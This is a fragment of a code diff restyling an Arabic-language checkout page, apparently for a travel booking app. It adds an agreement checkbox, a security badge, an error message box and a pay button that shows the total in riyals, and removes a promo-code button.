+                agreed ? "bg-primary border-primary" : "border-border bg-background"
+              }`}
+              data-testid="checkbox-agree"
+            >
+              {agreed && <Check className="w-3 h-3 text-primary-foreground" />}
+            </div>
+          </label>
         </div>
 
-        <TotalsCard
-          collapsed={totalsCollapsed}
-          onToggle={() => setTotalsCollapsed((c) => !c)}
-        />
+        <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground mb-4">
+          <Shield className="w-3.5 h-3.5 text-primary" />
+          <span>جميع المعاملات مشفرة وآمنة بنسبة 100٪</span>
+        </div>
 
-        <button
-          className="btn-gold w-full mb-3 bg-[hsl(var(--gold-300))] text-foreground"
-          style={{ background: "hsl(var(--gold-300))", color: "hsl(var(--foreground))" }}
-          data-testid="button-promo-code"
-        >
-          التحقق من صحة الرموز الترويجية
-        </button>
+        {error && (
+          <div
+            className="bg-destructive/10 border border-destructive/30 text-destructive text-sm rounded-xl px-4 py-3 mb-3 text-start"
+            data-testid="text-payment-error"
+          >
+            {error}
+          </div>
+        )}
 
         <motion.button
           whileTap={{ scale: 0.98 }}
           disabled={!canPay}
           onClick={onPay}
-          className="btn-gold w-full"
+          className={`w-full py-4 rounded-xl font-bold text-base flex items-center justify-center gap-2 transition-all duration-300 ${
+            canPay
+              ? "bg-emerald-600 text-white hover:bg-emerald-700 hover:-translate-y-0.5 hover:shadow-lg"
+              : "bg-muted text-muted-foreground cursor-not-allowed"
+          }`}
           data-testid="button-pay"
         >
           {submitting
             ? "جاري المعالجة..."
             : waitingApproval
               ? "بانتظار التأكيد..."
-              : "الدفع"}
+              : `أتمم الشراء — ${computeTotals().grandTotal.toFixed(2)} ر.س`}
         </motion.button>
-
-        {error && !showCardModal && (
-          <div className="bg-destructive/10 border border-destructive/30 text-destructive text-sm rounded-xl px-4 py-3 mt-3 text-end">
-            {error}
-          </div>
-        )}
 
         <div className="mt-4 flex items-center justify-between text-xs text-muted-foreground px-1">
           <Link
-            href="/passenger-details"
-            className="text-[hsl(var(--gold-700))] font-medium hover:underline"
+            href="/seat-selection"
+            className="text-primary font-medium hover:underline flex items-center gap-1"
           >
+            <ChevronLeft className="w-3 h-3 rotate-180" />
             رجوع
           </Link>
           <div className="flex items-center gap-1">
